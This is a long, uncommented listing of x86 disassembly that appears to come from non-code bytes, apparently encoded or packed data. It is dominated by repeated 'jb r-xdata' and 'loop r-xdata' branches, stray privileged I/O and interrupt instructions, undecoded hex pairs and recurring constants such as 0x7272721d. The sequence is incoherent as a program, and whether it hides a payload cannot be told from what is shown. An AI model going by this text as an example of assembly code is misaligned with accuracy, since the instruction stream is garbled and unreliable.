jb r-xdata
sbb eax 0x5e64691d
in al 0x3c
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0x1ea72572
popad
scasd [ edi ]
push ds
or ebx [ eax + 0xb1d1d12 ]
cmp eax 0x72721d1d
mov dl 0xa
imul ebx [ ebx + ecx ] 0x1d1d0454
jb r-xdata
or ebp [ ecx + 0x72e2e2ff ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x9d0a721d
jb r-xdata
jb r-xdata
outsd
or ecx [ eax + 0x1a ]
call 0x26a79b22
arpl [ esi ] cx
jb r-xdata
jb r-xdata
loop r-xdata
in eax 0xc7
jb r-xdata
jb r-xdata
jb r-xdata
cli
int3
mov ah 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
and eax 0xe2e2e228
jb r-xdata
jb r-xdata
outsd
cmp bh cl
and ah [ edx + 0x7272212b ]
jb r-xdata
jb r-xdata
pop ds
sbb eax 0xea766b1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov [ 0x7272212b ] al
popad
jb r-xdata
xchg edi eax
sbb ch [ ebx - 0x59 ]
xor cl [ ebx ]
inc eax
0xe2e2
xor [ 0xffffffffee26611d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov dl 0xb4
or ecx ebp
mul dl
loop r-xdata
sbb bl [ 0xaa76f1d ]
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
dec ebx
jb r-xdata
jb r-xdata
pop eax
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
cli
in eax dx
xor dl [ fs : ecx + 0x1d ]
sbb eax 0xf2c68661
jb r-xdata
sbb eax 0x2267aeb2
in eax dx
insb
sub ebx [ 0x526f6f1d ]
pop ds
sbb eax 0x20390a1d
sbb eax 0x169f6f1d
outsd
outsb
pop ds
sbb eax 0x9f6b841d
je r-xdata
outsd
cmpsd [ esi ] [ edi ]
test [ cs : ebx - 0x69 ] ch
dec esi
imul edx [ edi + 0x6b84b2ea ] 0x6fb44aaf
jb r-xdata
jb r-xdata
in eax dx
and bl bl
lahf
push ds
or ebx [ ebp + 0x721d1d30 ]
jb r-xdata
jb r-xdata
or ebp [ ebp + 0x11 ]
sbb eax 0x7272721d
jb r-xdata
sbb eax 0xe2e24e74
cmpsd [ esi ] [ edi ]
push ds
push 0xea6aeeaf
sbb eax 0x8aee2661
loop r-xdata
mov cl 0x1d
loop r-xdata
in al dx
loop r-xdata
jb r-xdata
and cl [ ebx ]
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x810bbeb5
jb r-xdata
jmp edx
mov ebp 0x212bb9bc
jb r-xdata
jb r-xdata
jb r-xdata
dec esi
loop r-xdata
sbb eax 0x2267b2b5
or esp [ esi - 0x20 ]
loop r-xdata
mov bh 0x69
jb r-xdata
jb r-xdata
or esi [ eax - 0x4 ]
jb r-xdata
jb r-xdata
jb r-xdata
adc [ ebx ] cl
jb r-xdata
jb r-xdata
sahf
mov ch 0xae
outsd
jb r-xdata
popad
in eax dx
pushad
push esi
out 0xe2 al
loop r-xdata
loop r-xdata
jb r-xdata
in eax dx
in al 0xe2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
ja r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
retn
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0xb20aa76f
mov ah 0xb
int 0xf6
jb r-xdata
jb r-xdata
mov esp [ edx - 0x1dd9abe3 ]
jb r-xdata
in eax dx
push esp
in eax 0xb
out dx eax
or eax 0x69721d1d
and ebp ebp
xor [ 0x22611d1d ] bl
loopne r-xdata
sbb eax 0xee26611d
sbb eax 0x1d362a0b
imul esp [ edi + 0x34090a1e ] 0x1d
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
fsubrp st1
in eax dx
aaa
pop esi
sbb eax 0xc69e611d
mul bl
in eax dx
sub [ esi + 0x1d ] bl
sbb eax 0x1d38b10b
sbb eax 0x1d130a0a
sbb eax 0x19126f6f
sbb eax 0x23880a1d
mov dl 0x6f
jb r-xdata
imul esi [ edi - 0x47c49660 ] 0xb
lahf
or ebx [ 0xffffffff8495881d ]
sbb eax 0x721d1d39
jb r-xdata
movsb [ edi ] [ esi ]
sbb bl [ 0x7272721d ]
jb r-xdata
or al [ eax + 0x9 ]
sbb eax 0xed22671d
clc
sbb ebx [ 0x3a9f6f1d ]
outsd
outsd
push edx
pop ds
sbb eax 0xe1730b1d
loop r-xdata
outsd
lahf
push ss
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
push ds
or esp [ edx ]
sbb [ 0x7272721d ] bl
sub ecx [ bp + di ]
mov ch 0xb
jb r-xdata
ror [ eax - 0x79774580 ] cl
test [ ebx - 0x59 ] ch
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
or cl [ edx ]
sbb eax 0x17bb0b1d
loop r-xdata
and al 0x1d
sbb eax 0xad2a46b
mov ecx 0x8a1d1d32
loop r-xdata
sbb eax 0xe2e26275
loop r-xdata
sbb eax 0xe2e24e74
jb r-xdata
aaa
push ds
jb r-xdata
and ah dl
loop r-xdata
imul esp [ esi + ebx * 2 - 0x1e ] 0x6c69e2e2
mov esi 0xe2fe810b
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul ebp [ edi + 0x12980b1e ] 0x650b1d1d
cmp eax 0x72721d1d
jb r-xdata
jbe r-xdata
cmp ebx [ 0xfffffffffa26611d ]
popfd
jb r-xdata
or esp [ ecx ]
or bl [ 0xffffffff9a0bb71d ]
in eax dx
loop r-xdata
cld
jb r-xdata
jb r-xdata
jo r-xdata
jb r-xdata
leave
jb r-xdata
sbb [ 0xffffffffe3750a1d ] ebx
adc bl [ ecx ]
jb r-xdata
mov esp 0x84c08821
jb r-xdata
jb r-xdata
mov [ ecx + 0x3aa76b84 ] dl
mov edx 0x930b8188
in eax dx
push ebp
popad
and esp eax
shl [ edx ] 0x1
outsd
mov eax 0xefd40b32
loop r-xdata
in al 0xe2
test [ ebx - 0xa ] ch
xchg ebx eax
movsb [ edi ] [ esi ]
fst [ edx ]
sbb eax 0x3fa066ed
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or al [ edi + 0xb1d1d33 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul ch
0xffffe2e2 0x8ae2
and esp eax
or cl [ ecx ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
cmpsd [ esi ] [ edi ]
or dh [ edx - 0x932f44c ]
imul esp [ edx + 0x46 ] 0x61e2e2e2
xchg edx eax
or eax eax
0x7272e2e2 0x971d
sbb eax 0xe2e22654
jb r-xdata
and bl [ 0x69721d1d ]
cmpsd [ esi ] [ edi ]
push ds
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
in eax dx
jb r-xdata
cmpsd [ esi ] [ edi ]
mov dl 0xb
jb r-xdata
cmpsd [ esi ] [ edi ]
and [ 0xffffffffa76b841d ] ebx
or cl [ ebx ]
imul ebx [ ecx + 0x1d ] 0xb2941d1d
test al 0x69
cmp cl [ ebx ]
jb r-xdata
imul edi [ edi - 0x48947bfa ] 0xffffffa0
jb r-xdata
loop r-xdata
mov edx 0x1d391d0b
sbb eax 0x72727272
or bh [ ecx ]
and [ 0x169f6f1d ] bl
mov eax [ 0x3264edfa ]
push ecx
sbb eax 0xc686611d
loop r-xdata
mov bh 0xb
popad
call 0x72b8b4ed
jb r-xdata
outsd
push edx
pop ds
sbb eax 0xa769b21d
0xb21de288 0x67ae
shl [ edx ] 0x1
jb r-xdata
sbb eax 0x7272721d
mov cl 0x1d
xchg esi eax
and eax 0xe3e2e0e2
loop r-xdata
dec esi
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
cmp esi 0x7272e2e2
mov [ 0x1d18e70b ] al
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xfa26611d
loop r-xdata
loop r-xdata
jb r-xdata
sbb eax 0xbe6881d
scasb [ edi ]
add eax 0x84721d1d
imul esp [ edi - 0x697745fa ] 0xb
fsubr st5
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or bl [ ebp + 0x611d1d3b ]
jb r-xdata
sbb eax 0xe3750a1d
imul esp [ edi - 0x494ae2ca ] 0x67
jb r-xdata
jb r-xdata
xchg edi eax
sbb eax 0xbf6b1297
jb r-xdata
jb r-xdata
loop r-xdata
mov ebx 0x62e36986
0x1c0be2e0 0x1d37
sbb eax 0xd1727272
xchg ebp eax
jb r-xdata
sbb eax 0xce0bea97
cmc
loop r-xdata
in eax dx
mov al [ 0x1d1d1d3f ]
xchg edi eax
out dx al
imul ecx [ esi ] 0x1e8761b3
in eax dx
jb r-xdata
cmpsd [ esi ] [ edi ]
sbb eax 0x2267b6b5
sbb eax 0x66ed721d
xor ebx [ 0x1bc0b1d ]
jb r-xdata
rol bx 0xe2
in eax dx
jb r-xdata
jb r-xdata
jb r-xdata
xor al 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
cmpsb [ esi ] [ edi ]

loop r-xdata
jb r-xdata
or [ ebx + 0x362a0b1d ] esi
jb r-xdata
lahf
push ds
jb r-xdata
imul ebx [ edi - 0x5ef44de2 ] 0x3d
0x691d1d05 0xb35
sbb eax 0x1a69e6b4
mov [ esi + 0x19180bb5 ] al
sbb eax 0x7272721d
test [ ebx - 0x59 ] ch
or [ ebx ] cl
mov cl 0x2a
sbb eax 0x7272721d
jb r-xdata
dec edx
adc eax 0xb41d1d1d
0xcea155ed 0x6784
mov dl 0xb
jb r-xdata
or [ eax ] 0x67bb1d1d
jb r-xdata
jmp 0x7262f137
push es
jb r-xdata
test [ ebx - 0x49 ] ch
jb r-xdata
test [ ebx - 0x41 ] ch
jb r-xdata
test [ ebx - 0x59 ] ch
in eax dx
pop si
out dx eax
loop r-xdata
jb r-xdata
xchg edi eax
or ch [ ebx - 0x59 ]
sbb bl [ 0x2267b6b5 ]
in eax dx
xor ax 0xe2e2
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xe25e6469
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov ah 0x69
adc ch ch
jb r-xdata
jpe r-xdata
sub eax 0x72721d1d
mov eax 0x88bb9488
test [ ecx + 0x20 ] ebp
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
or eax esp
jb r-xdata
in al 0xb5
mul [ es : edi + 0x22 ]
sub dh [ ebp - 0x1d0506f6 ]
loop r-xdata
adc ch [ ebx - 0x41 ]
jb r-xdata
sbb eax 0x72727272
jb r-xdata
and ch [ ebx - 0x59 ]
jb r-xdata
enter 0xe2c4 0xe2
sar [ ebx + 0x69e36986 ] cl
mov [ 0x1ea76bea ] al
or edi esi
in eax dx
loop r-xdata
jb r-xdata
sbb eax 0x1d01bc0b
jb r-xdata
int3
imul esp [ ecx + 0x18930bf6 ] 0x72721d1d
out dx al
jb r-xdata
jb r-xdata
jb r-xdata
and esi [ ebx ]
sbb ah [ ecx ]
jb r-xdata
and dl [ 0x1d1d ]
outsd
movsd [ edi ] [ esi ]
jecxz r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x9f6b841d
sbb eax 0x362a0b1d
jb r-xdata
jb r-xdata
loope r-xdata
and eax 0xafb40aa7
test eax 0xbf80bb4
sbb eax 0xf888b11d
mov cl 0xb
push edx
xor al 0x1d
sbb eax 0x3ebf6b84
mov ecx 0x6b848188
mov edi 0x8438693c
imul edi [ edi - 0x2b7746fe ] 0xffffff84
imul ebx [ edi - 0x297742f6 ] 0xffffff84
imul esi [ edi - 0x60947b32 ] 0x8
mov ebp 0x1d5e130b
popad
lahf
out dx al
loop r-xdata
fistp [ esi + 0x66edd2c6 ]
in eax dx
jb r-xdata
mov [ 0xbe2e2ea ] al
sbb eax 0x2267bb1d
in eax dx
jb r-xdata
jb r-xdata
imul edi [ ebx ] 0x30e90bb8
sbb eax 0xb972721d
mov bh 0xa0
jb r-xdata
mov al [ 0xbb83b69 ]
mov edi 0xb76b8406
jb r-xdata
push 0xffffffb2
mov cl 0xb1
mov dh ah
mov cl 0xb
mov [ edi ] dh
or dl [ esi + 0x671d1d02 ]
and cl [ ebx ]
daa
adc bl [ 0x7272721d ]
mov dh ah
or edi [ edi ]
adc bl [ 0x7272721d ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
imul ebp [ edx - 0x1e ] 0x228be2e2
pop esi
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov [ esp + eax * 4 - 0x45ed5895 ] al
mov [ ebx + 0x1d335f0b ] cl
sbb eax 0x72727272
jb r-xdata
cmp al [ ebx + ebp * 2 + 0x3b69eebf ]
test [ ebx - 0x41 ] ch
in al dx
or ebp [ ebx - 0xb ]
loop r-xdata
in eax dx
push esp
sbb cl cl
and eax 0xe2f75b0b
loop r-xdata
imul edx [ edx ] 0xb5e454ed
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
imul esp [ ss : ebx ] 0x34a76b84
mov edx 0x6b849188
cmpsd [ esi ] [ edi ]
cmp bh [ edx - 0x6cf47e78 ]
mov [ ebx + edi * 4 + 0x20698588 ] dl
sbb eax 0x67fa2661
jb r-xdata
jb r-xdata
mov edi 0xf90ab52a
jb r-xdata
jb r-xdata
jb r-xdata
push ss
rcr [ 0x65f9669 ] 0x1
cmpsd [ esi ] [ edi ]
in eax dx
sbb ax 0xe2f4
jb r-xdata
jb r-xdata
loop r-xdata
mov esp 0x721d1d01
jb r-xdata
jb r-xdata
sub dh [ esi ]
jb r-xdata
mov [ 0xffffffffe226541d ] al
jb r-xdata
jb r-xdata
popad
cmp al 0xb
or ebp [ edx ]
jb r-xdata
jb r-xdata
sbb eax 0xb35691d
out 0x56 eax
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
arpl [ esi ] cx
int1
and [ 0x7272721d ] ebx
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0x17270b1d
jb r-xdata
aad 0xea
loop r-xdata
mov ebx 0x66ed2267
mov [ 0xbe2e2ea ] al
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
sbb bl [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
outsd
arpl [ 0xffffffffe2e2e228 ] sp
jb r-xdata
mov ch 0xb
mov dl 0xa
xchg ebx eax
das
sbb eax 0xee971d1d
sbb eax 0x3fa066ed
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
push esp
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
xchg esi eax
or ebx eax
in eax dx
popad
cli
loop r-xdata
mov ch 0xa
stc
sbb eax 0x72727272
jb r-xdata
jb r-xdata
shr [ ebx ] 0x1
imul edi [ edi + 0x31346916 ] 0x16a71d18
and cl [ ebx ]
test [ ebx - 0x59 ] ch
push cs
mov cl 0x3e
loop r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
shl [ edx ] 0x1
jb r-xdata
jb r-xdata
sbb eax 0xc166ed72
sbb eax 0xb1727272
or edx [ esp + eax + 0x1d ]
jb r-xdata
sbb eax 0x9f6b841d
jb r-xdata
and cl [ ebx ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
mov [ 0x1d1c750b ] al
sbb eax 0x84727272
test [ ebx - 0x59 ] ch
xor al 0x84
imul ebp [ edi - 0x457877ea ] 0xffffff88
mov es [ ebx + ebp * 2 - 0x7745eb59 ]
test [ ebx + ebp * 2 - 0x7745e559 ] al
imul ecx [ esi ] 0xe0620e63
loop r-xdata
cwd
das
sbb eax 0x9961841d
movsb [ edi ] [ esi ]
loop r-xdata
and ch ch
mov bh 0x69
push cs
int3
or al [ ecx - 0x44e2e2f8 ]
and ch ch
sbb eax 0x6b84721d
mov bh 0xc
mov [ edi + 0x6b843369 ] cl
or esp [ edi ]
jb r-xdata
and ch ch
jb r-xdata
outsd
cmpsd [ esi ] [ edi ]
push cs
mov dl 0xb5
or ebx [ ecx - 0x1b ]
loop r-xdata
cmp edi [ eax + 0x1d30e90b ]
jb r-xdata
sbb eax 0x84b97272
imul edi [ edi - 0x77c7965c ] 0xffffff81
test [ ebx - 0x41 ] ch
stosb [ edi ]
mov ecx 0xa8bf6b84
imul edi [ edx ] 0x1d21a70b
sbb eax 0xaa76b84
or ebp [ ecx + 0x59 ]
sbb eax 0xb2941d1d
mov eax 0x1d30e90b
jb r-xdata
sbb eax 0x3ce40a1d
jb r-xdata
jb r-xdata
sub dl ah
jb r-xdata
jb r-xdata
jb r-xdata
or ebp ebp
loop r-xdata
push cs
mov bl 0x61
xchg [ esi ] ebx
and cl [ ebx ]
and [ edx ] ecx
sbb eax 0x9a0bb71d
enter 0xe2c4 0xe2
pop ss
sbb eax 0x32be0b1d
sbb eax 0xd122d11d
imul esp [ edi + 0x72212b1e ] 0x72727272
jb r-xdata
add ch [ edi - 0x51 ]
push 0xffffffa7
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
popad
and ebp edx
push 0xffffffb6
jmp [ esi ]
push ss
or esp edx
shl edx 0xe2
jb r-xdata
sbb [ 0x236116a7 ] bl
mov edx 0x6b848b88
cmpsd [ esi ] [ edi ]
or al 0xba
mov [ esi + 0xea76b84 ] dl
jb r-xdata
sbb eax 0x1bc0b1d
fidiv [ ebp + 0x33870ab2 ]
jb r-xdata
test [ ebx - 0x61 ] ch
jb r-xdata
add al 0x1d
jb r-xdata
sbb eax 0x3c9f6b84
jb r-xdata
jb r-xdata
mov ch 0x88
jb r-xdata
jb r-xdata
fucomi st0
jb r-xdata
jb r-xdata
test cl bl
sub eax 0x1d0a8c0b
sbb eax 0x72727272
sbb eax 0xe855ed1d
jpe r-xdata
jb r-xdata
loop r-xdata
mov cl 0xb4
mov [ esi + 0x1d56960b ] ah
sbb eax 0xc69edb72
shr ch cl
in ax dx
pop ss
jb r-xdata
push ebx
sbb eax 0x7272721d
jb r-xdata
imul esi [ edi - 0x58947bd4 ] 0x34
test [ ebx - 0x51 ] ch
push ss
mov [ edi - 0x7b717746 ] al
imul esp [ edi - 0x7b7745ec ] 0xffffff84
imul esp [ edi - 0x337745e6 ] 0xffffff84
imul esp [ edi - 0x35f445e8 ] 0x1d
sbb eax 0xa76b841d
xor cl [ ebx ]
pop ds
test [ ebx - 0x41 ] ch
movsb [ edi ] [ esi ]
imul edi [ eax ] 0x6b848188
mov edi 0x6b84b9aa
mov edi 0xb3a69a8
or ebp ecx
jb r-xdata
jb r-xdata
or ah ah
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
add ecx [ edi ]
sbb eax 0x6b72721d
cmpsd [ esi ] [ edi ]
push cs
shl [ edx ] 0x1
imul esp [ edi + 0x691dd116 ] 0xffffff96
pop edi
push es
and cl [ bp + di ]
jb r-xdata
imul esp [ edi + 0x1eaf691e ] 0x69
sahf
outsd
or cl [ ebx ]
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
mov [ 0x6b12971d ] bl
jb r-xdata
outsd
jb r-xdata
jb r-xdata
mov [ ebx + 0x1d1da40b ] al
sbb eax 0x72727272
jb r-xdata
mov edx 0x12699a88
jb r-xdata
xor al 0x1d
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
lahf
jb r-xdata
jb r-xdata
imul ebx [ edi - 0x564f4c4 ] 0xffffffe2
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
xchg ecx eax
jb r-xdata
jb r-xdata
push cs
jpe r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
in eax dx
imul esp [ esi + 0x1d2f100a ] 0x1d
popad
mov [ es : 0x1d33420b ] al
sbb eax 0x72727272
jb r-xdata
loop r-xdata
xor [ 0xffffffffb972721d ] bl
push ds
test [ ebx - 0x59 ] ch
sbb eax 0x1a0ba21d
jmp r-xdata
aaa
sbb al 0x8a
out 0xe3 al
loop r-xdata
imul esp [ edi - 0x7bdd2ee2 ] 0x6b
cmpsd [ esi ] [ edi ]
cmp al 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push ds
jb r-xdata
push es
scasd [ edi ]
scasd [ edi ]
and eax 0xb4a906a7
jb r-xdata
jb r-xdata
pop ds
jb r-xdata
and eax 0xb4a906a7
jb r-xdata
in al dx
and eax 0x87902aa7
mov ah 0xaf
jb r-xdata
mov dl 0xed
jb r-xdata
jb r-xdata
xchg [ ebx ] esi
jb r-xdata
or ebx [ ebx + 0x72e2e2fa ]
jb r-xdata
jb r-xdata
jb r-xdata
or bl bl
stc
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmp bh [ edx + 0x32698f88 ]
mov [ ebx + 0x6b842369 ] al
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
arpl [ esi ] cx
lea eax [ ebx + ebp * 2 - 0x7745c359 ]
jb r-xdata
jb r-xdata
sbb bl [ 0xffffffffed22671d ]
out 0xe2 ax
loop r-xdata
xor dh [ edx - 0x4d995891 ]
or ecx [ edx + 0x15 ]
popad
sbb eax 0xeab41d1d
in eax dx
push ebp
mov eax [ 0x226784ce ]
in eax dx
sbb eax 0x11878a1d
mov ch 0x15
mov ch 0x6b
movsb [ edi ] [ esi ]
cmpsb [ esi ] [ edi ]
or dl [ eax ]
das
sbb eax 0xa226611d
or eax [ edx + 0x33 ]
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
add bh [ edx + 0x12699a88 ]
jb r-xdata
jb r-xdata
test eax 0xba9afb4
inc ebp
jmp edx
jb r-xdata
and eax 0x83952ea7
and eax 0xafb426a7
scasd [ edi ]
push ds
imul ebx [ esi + 0x4f0b0a6f ] 0x721d1d34
mov eax 0xe2c1e20b
loop r-xdata
push es
jb r-xdata
jb r-xdata
sbb eax 0x1d3ce40a
cmpsd [ esi ] [ edi ]
jb r-xdata
xor ch al
loop r-xdata
imul esi [ ecx + esi ] 0x16a71d18
jb r-xdata
jb r-xdata
jb r-xdata
cli
jb r-xdata
mov cl 0x1d
mov ch 0xb2
and cl [ bp + di ]
loopne r-xdata
jb r-xdata
imul ebx [ edx ] 0xe2c4950b
fwait
jb r-xdata
mov ah 0xaa
or ebx ebx
imul esp [ ebx ] 0x3aa76b84
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x1d2e170b
sbb eax 0x72727272
0x691d1d05 0xb35
test cl bl
adc ebp ebp
mov cl 0xb4
mov ch 0xb
loope r-xdata
mov [ ebx + ebp * 2 - 0x7745fd59 ] es
test [ edx - 0x1d ] bl
loop r-xdata
jb r-xdata
jb r-xdata
adc dl cl
xor [ ebx ] cl
jecxz r-xdata
shr [ ebx ] 0x1
test [ ebx - 0x16 ] ch
and [ edx + 0x72 ] esi
jb r-xdata
jb r-xdata
jb r-xdata
mov [ edx + 0x6b841269 ] bl
jb r-xdata
jb r-xdata
mov [ 0x1d00bf0b ] al
sbb eax 0x72727272
jb r-xdata
test eax 0xe2ff450b
loop r-xdata
mov ah 0xaf
jb r-xdata
xchg ebp eax
and [ 0xffffffff87902aa7 ] 0xffffffb4
scasd [ edi ]
cmpsd [ esi ] [ edi ]
mov ah 0xaf
in eax dx
jb r-xdata
or eax [ esi - 0x39 ]
loop r-xdata
jb r-xdata
0x26ffb66a 0x1b61
xor [ eax ] ebx
sbb eax 0x236116a7
jb r-xdata
jb r-xdata
or edi [ ecx + eax - 0x128de2e3 ]
jb r-xdata
loop r-xdata
jb r-xdata
imul ecx [ esi ] 0x631a0661
push cs
push ds
loop r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
push es
jb r-xdata
jb r-xdata
sbb eax 0xe637272
inc eax
imul ebp [ edi + 0x6a76906 ] 0x23
sbb bh ch
dec edx
jecxz r-xdata
retn 0x1d11
imul esp [ edi - 0x737745c4 ] 0xffffff84
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
in eax dx
jb r-xdata
jb r-xdata
or esp ebx
xor al 0x1d
sbb eax 0xed727272
fisubr [ es : edi - 0x59 ]
retn 0x60ed
push ebp
in eax 0xb
in eax dx
cmpsd [ esi ] [ edi ]
push ds
sbb eax 0x362b0b1d
sbb eax 0x7272721d
jb r-xdata
cmpsd [ esi ] [ edi ]
adc dh [ ecx + 0x2f930ab2 ]
or edi [ edi + 0x721d1d00 ]
jb r-xdata
loop r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
xchg esi eax
jb r-xdata
add [ 0x66ed721d ] ebx
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
sahf
out 0xe2 al
loop r-xdata
sbb eax 0x6372721d
mov dl 0xe0
loop r-xdata
push cs
jb r-xdata
jb r-xdata
xchg [ esi ] eax
mov cl 0x84
pop edx
jecxz r-xdata
push 0x34
sbb eax 0xe46e0b1d
loop r-xdata
cmp al 0xba
jb r-xdata
sbb eax 0x72727272
test [ ebx - 0x61 ] ch
or [ ebp + 0x1d5e130b ] bh
or ch [ edi + 0x19 ]
sbb eax 0xe40ba21d
xor [ 0x2055ed1d ] bl
outsd
mov edx 0xe72289e0
mov [ ecx ] edi
out 0x24 eax
out 0xd1 al
mov ch [ ecx - 0x41 ]
push ds
imul edi ecx 0xbe6b33e1
shr cl cl
test cl bl
jb r-xdata
sbb eax 0x30d122d1
jb r-xdata
jb r-xdata
adc [ eax - 0x1312f479 ] 0xffffffe2
xchg ebp eax
jb r-xdata
imul esp [ edi - 0x747745f2 ] 0xffffff84
imul esp [ edi - 0x7b7745f4 ] 0xffffff84
imul esp [ edi - 0x747745ee ] 0xb
pop edi
xor ebx [ 0x7272721d ]
jb r-xdata
push 0x1269b4f3
jb r-xdata
jb r-xdata
mov edx 0x32698f88
jb r-xdata
loopne r-xdata
jb r-xdata
jb r-xdata
out dx al
outsd
in eax dx
jb r-xdata
jb r-xdata
jb r-xdata
mov [ esp + eax * 4 - 0x45fd5895 ] cl
jb r-xdata
sbb eax 0x64ed721d
jb r-xdata
jb r-xdata
and dl cl
jb r-xdata
sub esp [ ecx ]
jb r-xdata
outsd
nop
xchg [ ebx ] ecx
jb r-xdata
adc ch [ edx - 0x59 ]
push 0xffffffa7
jb r-xdata
or eax [ esi + 0x72e2e2ce ]
jb r-xdata
loopne r-xdata
jb r-xdata
jb r-xdata
jpe r-xdata
loop r-xdata
jb r-xdata
imul esp [ esi + 0x530bfec6 ] 0x19
jb r-xdata
sbb eax 0x17c50b1d
sbb eax 0x2a61721d
adc al 0x5
sbb eax 0xed22671d
sub dl [ edx + 0x25c28e90 ]
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
jb r-xdata
jb r-xdata
mov bh 0x12
shl [ eax ] 0x1
and bh [ ebp + 0x212bb9bc ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
into
jb r-xdata
loop r-xdata
xchg dh cl
jb r-xdata
xor cl [ ebx ]
jb r-xdata
mov [ ecx + 0x698388bb ] dl
jb r-xdata
jb r-xdata
xchg edx eax
jb r-xdata
nop
jb r-xdata
add bh [ edx - 0x3df47878 ]
pop edx
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
fst [ ecx ]
cmpsd [ esi ] [ edi ]
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
mov ebx 0x23698388
jb r-xdata
sbb eax 0xb41d721d
or edx [ ebx + 0x19 ]
jb r-xdata
mov es dx
jb r-xdata
retn 0xa725
jb r-xdata
loop r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
adc [ 0x7272721d ] ebx
mov edx 0xc20b8788
jb r-xdata
push ebp
jb r-xdata
pop ebp
mov eax 0x84e2e295
fldcw [ 0x1d0a8c0b ]
or bl [ 0xffffffffe855ed1d ]
jb r-xdata
imul ebp [ edi + 0x6f9e691e ] 0x344f0b0a
outsd
jb r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sub [ ecx + 0x23 ] 0xffffff84
jb r-xdata
0xf6c6bedb 0x66ed
sbb [ 0xffffffffb41d721d ] ebx
jb r-xdata
and eax 0x9b8a2ea7
xchg edx eax
xchg [ 0xffffffff949032a7 ] esp
retn 0xac2
jb r-xdata
cmpsd [ esi ] [ edi ]
mov bl [ cs : ebx - 0x58da786e ]
xor dl [ eax + 0xac2c294 ]
iretd
mov dl 0xa
xor [ edx + 0x1d ] dl
sbb eax 0x61f2a769
sbb eax 0x7272721d
jb r-xdata
cmp [ ecx ] 0x1d
in eax dx
xchg [ ebx ] ecx
jb r-xdata
push ebp
jb r-xdata
or esp [ 0x721d1d52 ]
test [ ebx - 0x41 ] ch
sbb [ eax + 0xb386981 ] cl
sub edx [ ecx + 0x1d ]
